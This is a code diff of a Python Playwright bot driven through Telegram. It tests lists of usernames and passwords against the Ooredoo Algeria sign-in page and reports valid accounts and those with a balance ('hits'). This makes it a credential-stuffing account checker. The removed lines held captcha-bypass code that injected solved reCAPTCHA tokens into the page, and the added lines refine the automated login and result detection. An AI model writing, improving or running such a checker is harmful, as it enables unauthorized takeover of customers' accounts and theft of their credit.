@@ -4,7 +4,8 @@
 Ooredoo Railway Bot
 - Playwright browser
 - Telegram interface
-- Manual captcha solving (only if visible)
+- Waits for page load, then fills, then submits
+- On error → stops and sends screenshot
 """
 
 import os
@@ -35,7 +36,6 @@ MIN_BALANCE = int(os.getenv("MIN_BALANCE", "100"))
 HEADLESS = os.getenv("HEADLESS", "true").lower() == "true"
 RETRY_DELAY = 3
 MAX_RETRY = 10
-CAPTCHA_TIMEOUT = 300
 
 SIGNIN_URL = "https://my.ooredoo.dz/sign-in"
 
@@ -50,7 +50,6 @@ log = logging.getLogger("ooredoo")
 #  📊 الحالة
 # ============================================================
 state = {"running": False, "stop": False, "stats": None}
-CAPTCHA_WAIT = {"future": None, "chat_id": None}
 
 
 class Stats:
@@ -62,7 +61,7 @@ class Stats:
         self.no_balance = 0
         self.invalid = 0
         self.retries = 0
-        self.captchas_solved = 0
+        self.errors = 0
         self.start_time = time.time()
         self.hits = []
 
@@ -86,7 +85,7 @@ class Stats:
             f"⚠️ بلا رصيد: <b>{self.no_balance}</b>\n"
             f"❌ invalid: <b>{self.invalid}</b>\n"
             f"🔄 إعادات: <b>{self.retries}</b>\n"
-            f"🧩 كابتشا: <b>{self.captchas_solved}</b>\n"
+            f"🛑 أخطاء: <b>{self.errors}</b>\n"
             f"⏱️ المدة: <b>{self.elapsed()}</b>"
         )
 
@@ -149,230 +148,55 @@ def is_invalid_creds(text):
     ])
 
 
-def is_retryable(text):
-    if not text:
-        return False
-    t = text.lower()
-    return any(p in t for p in [
-        "معاودة", "يرجى معاودة", "عذرا", "عذراً",
-        "réessayer", "veuillez réessayer",
-        "try again", "please try",
-        "temporary", "temporaire",
-        "too many", "429",
-        "server error", "timeout",
-    ])
-
-
 # ============================================================
-#  🧩 كشف الكابتشا (فقط المرئية)
+#  🖼️ كشف الصفحة الجاهزة (ماشي spinner)
 # ============================================================
-async def detect_captcha(page):
-    # 1) صورة كابتشا مرئية
-    for sel in [
-        "img[src*='captcha' i]",
-        "img[id*='captcha' i]",
-        "img[alt*='captcha' i]",
-    ]:
+async def wait_page_ready(page, timeout=30):
+    """
+    نستنو الصفحة تكون جاهزة:
+    - ما كاينش spinner
+    - كاين input fields
+    """
+    start = time.time()
+    while time.time() - start < timeout:
         try:
-            loc = page.locator(sel).first
-            if await loc.count() > 0 and await loc.is_visible():
-                box = await loc.bounding_box()
-                if box and box["width"] > 20 and box["height"] > 20:
-                    log.info("Captcha: image visible")
-                    return {"type": "image", "locator": loc, "selector": sel}
-        except Exception:
-            continue
+            # نتحققو إذا كاين spinner
+            spinner = await page.evaluate("""
+                () => {
+                    const s = document.querySelector(
+                        '.preloader-back, .preloader-floating-circles, ' +
+                        '.v-overlay--active .v-progress-circular, ' +
+                        '.v-progress-circular--indeterminate'
+                    );
+                    if (!s) return false;
+                    const st = getComputedStyle(s);
+                    return st.display !== 'none' && st.visibility !== 'hidden';
+                }
+            """)
+            if spinner:
+                await asyncio.sleep(0.5)
+                continue
 
-    # 2) input نصي مرئي
-    for sel in [
-        "input[name='ca']",
-        "input[id='ca']",
-        "input[name*='captcha' i]",
-        "input[id*='captcha' i]",
-    ]:
-        try:
-            loc = page.locator(sel).first
-            if await loc.count() > 0 and await loc.is_visible():
-                box = await loc.bounding_box()
-                if box and box["width"] > 20:
-                    log.info("Captcha: input visible")
-                    return {"type": "input", "locator": loc, "selector": sel}
-        except Exception:
-            continue
+            # نتحققو من وجود الحقول
+            has_inputs = await page.evaluate("""
+                () => {
+                    const pwd = document.querySelector('input[type=password]');
+                    const txt = [...document.querySelectorAll('input')].filter(i => {
+                        const t = i.type || 'text';
+                        return t !== 'password' && t !== 'hidden' && i.offsetParent !== null;
+                    });
+                    return !!(pwd && txt.length > 0);
+                }
+            """)
+            if has_inputs:
+                log.info("Page ready (inputs visible)")
+                return True
 
-    # 3) reCAPTCHA v2 مرئي
-    try:
-        v2 = page.locator("iframe[src*='google.com/recaptcha/api2/anchor']").first
-        if await v2.count() > 0:
-            if await v2.is_visible():
-                box = await v2.bounding_box()
-                if box and box["width"] > 50 and box["height"] > 30:
-                    log.info("Captcha: reCAPTCHA v2 visible")
-                    site_key = await page.evaluate("""
-                        () => {
-                            const ifr = document.querySelector("iframe[src*='recaptcha/api2/anchor']");
-                            if (!ifr) return null;
-                            const m = ifr.src.match(/[?&]k=([^&]+)/);
-                            return m ? m[1] : null;
-                        }
-                    """)
-                    return {"type": "recaptcha_v2", "sitekey": site_key}
-    except Exception:
-        pass
-
-    # 4) Enterprise مرئي فقط
-    try:
-        ent = page.locator("iframe[src*='recaptcha'][src*='enterprise']").first
-        if await ent.count() > 0 and await ent.is_visible():
-            box = await ent.bounding_box()
-            if box and box["width"] > 100 and box["height"] > 50:
-                log.info("Captcha: Enterprise iframe visible")
-                site_key = await page.evaluate("""
-                    () => {
-                        const ifr = document.querySelector("iframe[src*='recaptcha'][src*='enterprise']");
-                        if (!ifr) return null;
-                        const m = ifr.src.match(/[?&]k=([^&]+)/);
-                        return m ? m[1] : null;
-                    }
-                """)
-                return {"type": "recaptcha_enterprise", "sitekey": site_key}
-    except Exception:
-        pass
-
-    log.info("No visible captcha")
-    return None
-
-
-async def ask_user_captcha(bot, chat_id, page, captcha_info):
-    screenshot_path = "/tmp/captcha.png"
-    try:
-        if captcha_info["type"] == "image":
-            await captcha_info["locator"].screenshot(path=screenshot_path)
-        else:
-            await page.screenshot(path=screenshot_path, full_page=False)
-    except Exception:
-        try:
-            await page.screenshot(path=screenshot_path, full_page=False)
         except Exception:
             pass
+        await asyncio.sleep(0.3)
 
-    type_text = {
-        "image": "📷 صورة كابتشا",
-        "input": "⌨️ كابتشا نصية",
-        "recaptcha_v2": "🔒 reCAPTCHA v2",
-        "recaptcha_enterprise": "🔒 reCAPTCHA Enterprise",
-    }.get(captcha_info["type"], "❓ كابتشا")
-
-    caption = (
-        f"🧩 <b>كابتشا مطلوبة!</b>\n"
-        f"النوع: {type_text}\n"
-    )
-    if captcha_info.get("sitekey"):
-        caption += f"Site Key: <code>{captcha_info['sitekey'][:35]}...</code>\n"
-    caption += "\n<b>أرسل الحل هنا:</b>"
-
-    try:
-        with open(screenshot_path, "rb") as f:
-            await bot.send_photo(
-                chat_id=chat_id, photo=f,
-                caption=caption, parse_mode="HTML",
-            )
-    except Exception as e:
-        log.error("send_photo: %s", e)
-        await bot.send_message(chat_id=chat_id, text=caption, parse_mode="HTML")
-
-    loop = asyncio.get_event_loop()
-    fut = loop.create_future()
-    CAPTCHA_WAIT["future"] = fut
-    CAPTCHA_WAIT["chat_id"] = chat_id
-
-    try:
-        solution = await asyncio.wait_for(fut, timeout=CAPTCHA_TIMEOUT)
-    except asyncio.TimeoutError:
-        await bot.send_message(chat_id=chat_id, text="⏰ ما ردّيتش. نتخطى.")
-        return None
-    finally:
-        CAPTCHA_WAIT["future"] = None
-        CAPTCHA_WAIT["chat_id"] = None
-
-    return solution
-
-
-async def apply_solution(page, captcha_info, solution):
-    try:
-        if captcha_info["type"] in ("image", "input"):
-            loc = captcha_info["locator"]
-            await loc.scroll_into_view_if_needed()
-            try:
-                await loc.click(force=True, timeout=3000)
-            except Exception:
-                pass
-            try:
-                await loc.fill("", force=True)
-                await loc.press_sequentially(solution, delay=40)
-                await loc.press("Tab")
-            except Exception:
-                await page.evaluate(
-                    """
-                    ({sel, val}) => {
-                        const el = document.querySelector(sel);
-                        if (!el) return;
-                        el.focus();
-                        const setter = Object.getOwnPropertyDescriptor(
-                            window.HTMLInputElement.prototype, 'value'
-                        ).set;
-                        setter.call(el, val);
-                        el.dispatchEvent(new Event('input', {bubbles: true}));
-                        el.dispatchEvent(new Event('change', {bubbles: true}));
-                    }
-                    """,
-                    {"sel": captcha_info["selector"], "val": solution},
-                )
-            return True
-
-        if captcha_info["type"] in ("recaptcha_v2", "recaptcha_enterprise"):
-            await page.evaluate(
-                """
-                (t) => {
-                    let ta = document.querySelector(
-                        "textarea[name='g-recaptcha-response'], #g-recaptcha-response"
-                    );
-                    if (!ta) {
-                        ta = document.createElement('textarea');
-                        ta.name = 'g-recaptcha-response';
-                        ta.id = 'g-recaptcha-response';
-                        ta.style.display = 'none';
-                        document.body.appendChild(ta);
-                    }
-                    ta.value = t;
-                    ta.dispatchEvent(new Event('input', {bubbles: true}));
-                    ta.dispatchEvent(new Event('change', {bubbles: true}));
-                }
-                """,
-                solution,
-            )
-            try:
-                await page.evaluate(
-                    """
-                    (t) => {
-                        if (window.___grecaptcha_cfg) {
-                            const clients = window.___grecaptcha_cfg.clients || {};
-                            for (const id in clients) {
-                                const c = clients[id];
-                                if (c && c.callback) {
-                                    try { c.callback(t); } catch(e) {}
-                                }
-                            }
-                        }
-                    }
-                    """,
-                    solution,
-                )
-            except Exception:
-                pass
-            return True
-    except Exception as e:
-        log.error("apply_solution: %s", e)
+    log.warning("wait_page_ready timeout")
     return False
 
 
@@ -397,7 +221,7 @@ async def hide_overlays(page):
 
 
 async def fill_username(page, username):
-    # 1) JS setter
+    # 1) JS
     try:
         ok = await page.evaluate("""
             (val) => {
@@ -455,7 +279,6 @@ async def fill_username(page, username):
             if check == username:
                 log.info("Username filled via JS")
                 return True
-            log.info("JS fill: got '%s' expected '%s'", check, username)
     except Exception as e:
         log.warning("JS fill failed: %s", e)
 
@@ -473,7 +296,6 @@ async def fill_username(page, username):
         if not loc:
             for sel in [
                 "input[placeholder*='utilisateur' i]",
-                "input[placeholder*='Nom' i]",
                 "input[name*='user' i]",
                 "input[id*='user' i]",
             ]:
@@ -495,31 +317,16 @@ async def fill_username(page, username):
             await loc.press_sequentially(username, delay=60)
             await loc.press("Tab")
             val = await loc.input_value()
-            log.info("Username via press_sequentially: '%s'", val)
             if val == username:
+                log.info("Username filled via press_sequentially")
                 return True
     except Exception as e:
         log.warning("press_sequentially failed: %s", e)
-
-    # 3) fallback
-    try:
-        loc = page.locator("input:not([type=password]):not([type=hidden])").first
-        if await loc.count() > 0:
-            await loc.click(force=True, timeout=5000)
-            await loc.fill("", force=True)
-            await loc.type(username, delay=80)
-            await loc.press("Tab")
-            val = await loc.input_value()
-            log.info("Username via type: '%s'", val)
-            return val == username
-    except Exception as e:
-        log.warning("type failed: %s", e)
 
     return False
 
 
 async def fill_password(page, password):
-    # 1) JS
     try:
         ok = await page.evaluate("""
             (val) => {
@@ -544,24 +351,18 @@ async def fill_password(page, password):
             if check == password:
                 log.info("Password filled via JS")
                 return True
-    except Exception as e:
-        log.warning("JS password failed: %s", e)
+    except Exception:
+        pass
 
-    # 2) press_sequentially
     try:
         loc = page.locator("input[type=password]").first
         if await loc.count() > 0:
-            await loc.scroll_into_view_if_needed()
-            try:
-                await loc.click(force=True, timeout=5000)
-            except Exception:
-                pass
             await loc.fill("", force=True)
             await loc.press_sequentially(password, delay=60)
             await loc.press("Tab")
             val = await loc.input_value()
-            log.info("Password via press_sequentially (len=%d)", len(val or ""))
             if val == password:
+                log.info("Password filled via press_sequentially")
                 return True
     except Exception as e:
         log.warning("press_sequentially pwd failed: %s", e)
@@ -585,27 +386,105 @@ async def click_connexion(page):
         return False
 
 
-async def find_error(page):
+async def detect_red_error(page):
+    """يكتشف الخطأ الأحمر في الصفحة"""
+    try:
+        # 1) نبحث في الأخطاء الظاهرة
+        err = await page.evaluate("""
+            () => {
+                // رسائل v-messages
+                const vmsgs = [...document.querySelectorAll(
+                    '.v-messages__message, .v-input__details .v-messages'
+                )];
+                for (const m of vmsgs) {
+                    const t = (m.textContent || '').trim();
+                    if (t.length > 3 && t.length < 200) {
+                        const st = getComputedStyle(m);
+                        if (st.display !== 'none' && st.visibility !== 'hidden') {
+                            return t;
+                        }
+                    }
+                }
+                // رسائل toast
+                const toasts = [...document.querySelectorAll(
+                    '.Vue-Toastification__toast, .v-snackbar, .v-alert'
+                )];
+                for (const t of toasts) {
+                    const txt = (t.textContent || '').trim();
+                    if (txt.length > 3 && txt.length < 300) {
+                        const st = getComputedStyle(t);
+                        if (st.display !== 'none' && st.visibility !== 'hidden') {
+                            return txt;
+                        }
+                    }
+                }
+                return null;
+            }
+        """)
+        if err:
+            return err.strip()
+    except Exception:
+        pass
+
+    # 2) نبحث في نص الصفحة
     try:
         body = await page.inner_text("body")
     except Exception:
         body = ""
+
     pats = [
-        r"(identifiants?\s+incorrect[s]?[^\n]{0,80})",
-        r"(mot de passe\s+incorrect[^\n]{0,80})",
-        r"(Identifiants non valides[^\n]{0,80})",
-        r"(Invalid User Credentials[^\n]{0,80})",
-        r"(erreur[^\n]{0,100})",
-        r"(échec[^\n]{0,80})",
+        r"(identifiants?\s+non\s+valides[^\n]{0,100})",
+        r"(identifiants?\s+incorrect[s]?[^\n]{0,100})",
+        r"(mot de passe\s+incorrect[^\n]{0,100})",
+        r"(invalid user credentials[^\n]{0,100})",
         r"(عذرا[^\n]{0,120}معاودة[^\n]{0,120})",
         r"(يرجى معاودة[^\n]{0,120})",
         r"(veuillez\s+réessayer[^\n]{0,120})",
+        r"(erreur[^\n]{0,120})",
+        r"(خطأ[^\n]{0,120})",
     ]
     for p in pats:
         m = re.search(p, body, re.IGNORECASE)
         if m:
             return m.group(1).strip()
     return None
+
+
+async def wait_for_result(page, timeout=45):
+    """
+    نستنو النتيجة:
+    - URL يتغير (دخلنا)
+    - خطأ أحمر يظهر
+    - timeout
+    """
+    start = time.time()
+    last_url = page.url
+
+    while time.time() - start < timeout:
+        # 1) URL تغير؟
+        if page.url != last_url:
+            log.info("URL changed: %s -> %s", last_url, page.url)
+            if "/sign-in" not in page.url and "/login" not in page.url:
+                return {"status": "success", "url": page.url}
+            last_url = page.url
+
+        # 2) كاين خطأ؟
+        err = await detect_red_error(page)
+        if err:
+            return {"status": "error", "error": err}
+
+        # 3) نتحققو من أننا دخلنا (URL + ما كاينش password input)
+        if "/sign-in" not in page.url and "/login" not in page.url:
+            try:
+                has_pwd = await page.locator("input[type=password]").count()
+                if has_pwd == 0:
+                    return {"status": "success", "url": page.url}
+            except Exception:
+                pass
+
+        await asyncio.sleep(0.5)
+
+    return {"status": "timeout"}
 
 
 async def is_logged_in(page):
@@ -631,14 +510,34 @@ async def try_account(browser, user, pwd, bot, chat_id):
     page = await ctx.new_page()
 
     try:
+        # 1) نفتحو الصفحة
+        log.info("Opening %s", SIGNIN_URL)
         await page.goto(SIGNIN_URL, wait_until="domcontentloaded", timeout=60000)
-        await page.wait_for_timeout(4000)
-        await hide_overlays(page)
 
-        if not await fill_username(page, user):
-            log.error("Fill username FAILED for %s", user)
+        # 2) نستنو الصفحة تكون جاهزة
+        ready = await wait_page_ready(page, timeout=30)
+        if not ready:
+            log.warning("Page not ready after 30s")
+            await page.screenshot(path="/tmp/page_not_ready.png", full_page=True)
             try:
-                await page.screenshot(path="/tmp/fill_username_fail.png", full_page=True)
+                with open("/tmp/page_not_ready.png", "rb") as f:
+                    await bot.send_photo(
+                        chat_id=chat_id, photo=f,
+                        caption=f"⏰ الصفحة ما تحملتش على 30 ثانية\n{user}",
+                    )
+            except Exception:
+                pass
+            await ctx.close()
+            return {"status": "retry", "msg": "page not ready"}
+
+        await hide_overlays(page)
+        await page.wait_for_timeout(300)
+
+        # 3) نعبّيو الحقول
+        if not await fill_username(page, user):
+            log.error("Fill username FAILED")
+            await page.screenshot(path="/tmp/fill_username_fail.png", full_page=True)
+            try:
                 with open("/tmp/fill_username_fail.png", "rb") as f:
                     await bot.send_photo(
                         chat_id=chat_id, photo=f,
@@ -647,61 +546,102 @@ async def try_account(browser, user, pwd, bot, chat_id):
             except Exception:
                 pass
             await ctx.close()
-            return {"status": "retry", "msg": "fill_username failed"}
+            return {"status": "error", "msg": "fill_username failed", "stop": True}
 
         await page.wait_for_timeout(200)
 
         if not await fill_password(page, pwd):
-            log.error("Fill password FAILED for %s", user)
+            log.error("Fill password FAILED")
+            await page.screenshot(path="/tmp/fill_pwd_fail.png", full_page=True)
+            try:
+                with open("/tmp/fill_pwd_fail.png", "rb") as f:
+                    await bot.send_photo(
+                        chat_id=chat_id, photo=f,
+                        caption=f"❌ فشل تعبئة كلمة السر: {user}",
+                    )
+            except Exception:
+                pass
             await ctx.close()
-            return {"status": "retry", "msg": "fill_password failed"}
+            return {"status": "error", "msg": "fill_password failed", "stop": True}
 
         await page.wait_for_timeout(300)
 
-        # 🧩 نتحققو من الكابتشا (مرئية فقط)
-        captcha_info = await detect_captcha(page)
-        if captcha_info:
-            log.info("Captcha detected: %s", captcha_info["type"])
-            state["stats"].captchas_solved += 1
-            solution = await ask_user_captcha(bot, chat_id, page, captcha_info)
-            if not solution:
-                await ctx.close()
-                return {"status": "retry", "msg": "no captcha solution"}
-            ok = await apply_solution(page, captcha_info, solution)
-            if not ok:
-                await bot.send_message(chat_id=chat_id, text="⚠️ ما قدرناش نحطو الحل.")
-                await ctx.close()
-                return {"status": "retry"}
-            await page.wait_for_timeout(500)
-        else:
-            log.info("No captcha, proceeding")
+        # 4) نصوّرو قبل الضغط
+        await page.screenshot(path="/tmp/before_click.png", full_page=False)
 
+        # 5) نضغطو Connexion
         if not await click_connexion(page):
+            log.error("Connexion button not found")
+            await page.screenshot(path="/tmp/no_btn.png", full_page=False)
+            try:
+                with open("/tmp/no_btn.png", "rb") as f:
+                    await bot.send_photo(
+                        chat_id=chat_id, photo=f,
+                        caption=f"❌ زر Connexion ما لقيناش: {user}",
+                    )
+            except Exception:
+                pass
             await ctx.close()
-            return {"status": "retry"}
+            return {"status": "error", "msg": "no connexion button", "stop": True}
 
-        start = time.time()
-        while time.time() - start < 30:
-            if await is_logged_in(page):
-                await page.wait_for_timeout(1500)
-                body = await page.inner_text("body")
-                bal = find_balance_in_text(body)
+        log.info("Clicked Connexion, waiting for result...")
+
+        # 6) نستنو النتيجة
+        result = await wait_for_result(page, timeout=45)
+        log.info("Result: %s", result)
+
+        # 7) نصوّرو
+        await page.screenshot(path="/tmp/after_submit.png", full_page=False)
+
+        if result["status"] == "success":
+            # دخلنا — نجيبو الرصيد
+            await page.wait_for_timeout(2000)
+            body = await page.inner_text("body")
+            bal = find_balance_in_text(body)
+            await ctx.close()
+            return {"status": "success", "balance": bal}
+
+        if result["status"] == "error":
+            err = result["error"]
+            log.info("Error detected: %s", err)
+
+            # نبعتو صورة الخطأ للمستخدم
+            try:
+                with open("/tmp/after_submit.png", "rb") as f:
+                    await bot.send_photo(
+                        chat_id=chat_id, photo=f,
+                        caption=(
+                            f"🛑 <b>خطأ!</b>\n"
+                            f"الحساب: <code>{user}</code>\n"
+                            f"الخطأ: <code>{err}</code>\n\n"
+                            f"⏸️ البوت توقف."
+                        ),
+                        parse_mode="HTML",
+                    )
+            except Exception:
+                pass
+
+            # إذا invalid → نتخطى الحساب
+            if is_invalid_creds(err):
                 await ctx.close()
-                return {"status": "success", "balance": bal}
+                return {"status": "invalid", "msg": err}
 
-            err = await find_error(page)
-            if err:
-                if is_invalid_creds(err):
-                    await ctx.close()
-                    return {"status": "invalid", "msg": err}
-                if is_retryable(err):
-                    await ctx.close()
-                    return {"status": "retry", "msg": err}
+            # خطأ آخر → نوقف البوت
+            await ctx.close()
+            return {"status": "error", "msg": err, "stop": True}
 
-            await page.wait_for_timeout(500)
-
+        # timeout
+        log.warning("Timeout waiting for result")
+        try:
+            with open("/tmp/after_submit.png", "rb") as f:
+                await bot.send_photo(
+                    chat_id=chat_id, photo=f,
+                    caption=f"⏰ timeout بعد الضغط: {user}",
+                )
+        except Exception:
+            pass
         await ctx.close()
-        return {"status": "retry", "msg": "timeout"}
+        return {"status": "error", "msg": "timeout after submit", "stop": True}
 
     except Exception as e:
         log.exception("try_account error")
@@ -709,7 +649,7 @@ async def try_account(browser, user, pwd, bot, chat_id):
             await ctx.close()
         except Exception:
             pass
-        return {"status": "retry", "msg": str(e)}
+        return {"status": "error", "msg": str(e), "stop": True}
 
 
 # ============================================================
@@ -754,7 +694,19 @@ async def run_check(app, chat_id, accounts):
                         r = await try_account(browser, user, pwd, bot, chat_id)
                     except Exception:
                         log.exception("account failed")
-                        r = {"status": "retry"}
+                        r = {"status": "error", "msg": "exception", "stop": True}
+
+                    if r.get("stop"):
+                        # 🛑 نوقف البوت
+                        stats.errors += 1
+                        stats.done += 1
+                        await bot.send_message(
+                            chat_id=chat_id,
+                            text=f"🛑 <b>البوت توقف</b>\nالسبب: <code>{r.get('msg')}</code>",
+                            parse_mode="HTML",
+                        )
+                        state["stop"] = True
+                        break
 
                     if r["status"] == "success":
                         stats.success += 1
@@ -785,6 +737,9 @@ async def run_check(app, chat_id, accounts):
 
                 stats.done += 1
 
+                if state["stop"]:
+                    break
+
                 if time.time() - last_update > 15:
                     try:
                         await bot.send_message(
@@ -792,13 +747,14 @@ async def run_check(app, chat_id, accounts):
                             text=(
                                 f"⏳ <b>تقدم</b> {idx}/{len(accounts)}\n"
                                 f"✅ {stats.success} | 💰 {stats.hit} | "
-                                f"❌ {stats.invalid} | 🧩 {stats.captchas_solved}"
+                                f"❌ {stats.invalid} | 🛑 {stats.errors}"
                             ),
                             parse_mode="HTML",
                         )
                     except Exception:
                         pass
                     last_update = time.time()
+
         finally:
             await browser.close()
 
@@ -832,7 +788,7 @@ async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"⏳ <b>جاري...</b>\n"
             f"تم: {s.done}/{s.total}\n"
-            f"✅ {s.success} | 💰 {s.hit} | ❌ {s.invalid} | 🧩 {s.captchas_solved}",
+            f"✅ {s.success} | 💰 {s.hit} | ❌ {s.invalid} | 🛑 {s.errors}",
             parse_mode="HTML",
         )
     else:
@@ -842,8 +798,6 @@ async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     state["stop"] = True
     await update.message.reply_text("⏹️ جاري الإيقاف...")
-    if CAPTCHA_WAIT["future"] and not CAPTCHA_WAIT["future"].done():
-        CAPTCHA_WAIT["future"].cancel()
 
 
 async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -881,15 +835,6 @@ async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     text = update.message.text.strip()
-
-    if CAPTCHA_WAIT["future"] and not CAPTCHA_WAIT["future"].done():
-        CAPTCHA_WAIT["future"].set_result(text)
-        await update.message.reply_text(
-            f"✅ توصلت بالحل: <code>{text[:60]}</code>",
-            parse_mode="HTML",
-        )
-        return
-
     if text.startswith("/"):
         return
 
